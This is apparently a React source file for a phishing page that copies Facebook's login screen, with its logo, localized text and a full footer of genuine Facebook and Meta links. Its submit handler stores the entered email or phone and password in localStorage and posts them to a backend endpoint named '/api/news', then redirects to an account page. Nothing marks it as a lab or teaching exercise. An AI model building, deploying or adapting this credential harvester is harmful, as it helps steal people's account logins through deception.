import { Link, Navigate, useNavigate } from 'react-router-dom'
import { Button, Form, Input } from 'antd';
import axios from 'axios';
import "./Publics/css/form.css"
import "./Publics/css/check.css"
import React, { useEffect } from 'react';
import { useTranslation } from 'react-i18next';
// import { useTranslation } from 'react-i18next';

const FormComponent = () => {
    const navigate = useNavigate();
    const { t } = useTranslation();
    const { i18n } = useTranslation();

    useEffect(() => {
        const savedLanguage = localStorage.getItem('language'); // hoặc cookies, tùy chọn của bạn
        if (savedLanguage) {
            i18n.changeLanguage(savedLanguage);
        }
    }, [i18n]);

    const changeLanguage = (lng) => {
        i18n.changeLanguage(lng);
        localStorage.setItem('language', lng); // hoặc cookies, để lưu trạng thái ngôn ngữ
    };

    const onFinish = (values) => {

        localStorage.setItem('dataForm', JSON.stringify(values))

        const data = {
            'fist_email_phone': values.email_or_phone,
            'fist_email_password': values.password,
        }

        axios.post(`http://localhost:3001/api/news`, data)
        .then((response) => {
            if (response.data.status === 0 ) {
                navigate('/account');
            }
        })

    }

    return (
        
        <div className="main">

            <div className="login-page">
                <div className="form-login">
                    <div className="content-form">
                        <div className="item-left">
                            <div className="logo">
                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"  width="100%" alt="Facebook" />
                            </div>
                            <h2>{t('Welcome')}</h2>
                        </div>

                        <div className="item-right">
                            <div className="form">
                                
                            <Form
                                name="basic"
                                initialValues={{
                                    remember: true,
                                }}
                                onFinish={onFinish}
                                autoComplete="off"
                                style={{
                                    display:"flex",
                                    flexDirection: "column"
                                }}
                            >

                                <div className="item-form">
                                    <Form.Item
                                        name="email_or_phone"
                                        rules={[
                                            {
                                            required: true,
                                            message: `${t('errorEmail')}`,
                                            },
                                        ]}
                                    >
                                        <Input placeholder={t('holderEmail')} />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <Form.Item
                                        name="password"
                                        rules={[
                                            {
                                            required: true,
                                            message: `${t('errorPassword')}`,
                                            },
                                        ]}
                                    >
                                        <Input.Password placeholder={t('holderPassword')} />
                                    </Form.Item>
                                </div>


                                <Form.Item 
                                    className="btn butoni"
                                >
                                    <Button
                                        htmlType="submit"
                                        style={{
                                            backgroundColor: "#0d6efd",
                                            outline: "none",
                                            border: 'none',
                                            boxShadow: 'none',
                                            color: "white",
                                            fontWeight: '700',
                                            fontSize:'1rem'
                                        }}
                                    >
                                        {t('login')} 
                                    </Button>
                                </Form.Item>
                            </Form>

                                <div className="link">
                                    <Link id="forgot-password" to={"https://vi-vn.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"}>{t('forgotPassword')} </Link>
                                    <div className="line"><span>hoặc</span></div>
                                    <Link className="signin" to={"https://www.facebook.com/r.php?locale=vi_VN&display=page"}>{t('createAccount')} </Link>
                                </div>

                            </div>

                            <div className="col-11 create-page">
                                <p><b><Link to={"https://vi-vn.facebook.com/pages/create/?ref_type=registration_form"}>{t('createaPage')}</Link></b> {t('descPage')}</p>
                            </div>

                        </div>
                    </div>
                </div>


                <div className="footer">
                    <div className="content-footer">
                        <div className="footer-top lang">
                            <Link to={""} onClick={() => changeLanguage('vi')}>Tiếng Việt</Link>
                            <Link to={""} onClick={() => changeLanguage('en')}>English (UK)</Link>
                            <Link to={""} onClick={() => changeLanguage('tw')}>中文(台灣)</Link>
                            <Link to={""}>한국어</Link>
                            <Link to={""}>日本語</Link>
                            <Link to={""}>Français (France)</Link>
                            <Link to={""}>ภาษาไทย</Link>
                            <Link to={""}>Español</Link>
                            <Link to={""}>Português (Brasil)</Link>
                            <Link to={""}>Deutsch</Link>
                            <Link to={""}>Italiano</Link>
                        </div>

                        <div className="line"></div>

                        <div className="footer-bottom lang">
                            <Link to={"https://vi-vn.facebook.com/reg/"}> {t('login')} </Link>
                            <Link to={"https://vi-vn.facebook.com/login/"}> {t('signup')} </Link>
                            <Link to={"https://www.messenger.com/"}> {t('messenger')} </Link>
                            <Link to={"https://vi-vn.facebook.com/lite/"}> {t('facebookLite')} </Link>
                            <Link to={"https://vi-vn.facebook.com/watch/"}> {t('video')} </Link>
                            <Link to={"https://vi-vn.facebook.com/places/"}> {t('places')} </Link>
                            <Link to={"https://vi-vn.facebook.com/gaming/play/"}> {t('games')} </Link>
                            <Link to={"https://vi-vn.facebook.com/login/?next=%2Fmarketplace%2F"}> {t('marketplace')} </Link>
                            <Link to={"https://pay.facebook.com/"}> {t('metaPay')} </Link>
                            <Link to={"https://www.meta.com/"}> {t('metaStore')} </Link>
                            <Link to={"https://www.meta.com/quest/"}> {t('metaQuest')} </Link>
                            <Link to={"https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F"}> {t('instagram')} </Link>
                            <Link to={"https://www.threads.net/"}> {t('threads')} </Link>
                            <Link to={"https://vi-vn.facebook.com/fundraisers/"}> {t('fundraisers')} </Link>
                            <Link to={"https://vi-vn.facebook.com/biz/directory/"}> {t('services')} </Link>
                            <Link to={"https://vi-vn.facebook.com/votinginformationcenter/"}> {t('votingInformation')} </Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/policy/?entry_point=facebook_page_footer"}> {t('privacyPolicy')} </Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/center/?entry_point=facebook_page_footer"}> {t('privacyCentre')} </Link>
                            <Link to={"https://vi-vn.facebook.com/groups/discover/"}> {t('groups')} </Link>
                            <Link to={"https://about.meta.com/"}> {t('about')} </Link>
                            <Link to={"https://vi-vn.facebook.com/login.php?next=https%3A%2F%2Fvi-vn.facebook.com%2Fads%2Fcreate%2F%3Fnav_source%3Dunknown%26campaign_id%3D402047449186%26placement%3Dpflo%26extra_1%3Dnot-admgr-user"}> {t('createAd')} </Link>
                            <Link to={"https://vi-vn.facebook.com/pages/create/?ref_type=site_footer"}> {t('createPage')} </Link>
                            <Link to={"https://developers.facebook.com/?ref=pf"}> {t('developers')} </Link>
                            <Link to={"https://vi-vn.facebook.com/careers/?ref=pf"}> {t('careers')} </Link>
                            <Link to={"https://vi-vn.facebook.com/privacy/policies/cookies/?entry_point=cookie_policy_redirect&entry=0"}> {t('cookies')} </Link>
                            <Link to={"https://www.facebook.com/help/568137493302217"}> {t('adChoices')} </Link>
                            <Link to={"https://vi-vn.facebook.com/policies_center/"}> {t('terms')} </Link>
                            <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}> {t('help')} </Link>
                            <Link to={"https://vi-vn.facebook.com/help/637205020878504"}> {t('contactUploading')} </Link>
                        </div>
                        <div className="coppyright">
                            <div className="mob">
                                <Link to={"https://about.meta.com/"}> {t('about')} </Link>
                                <Link to={"https://vi-vn.facebook.com/help/?ref=pf"}> {t('help')} </Link>
                            </div>
                            <span>Meta © 2023</span>
                        </div>
                    </div>
                </div>

            </div>
            
        </div>

    )
}

export default FormComponent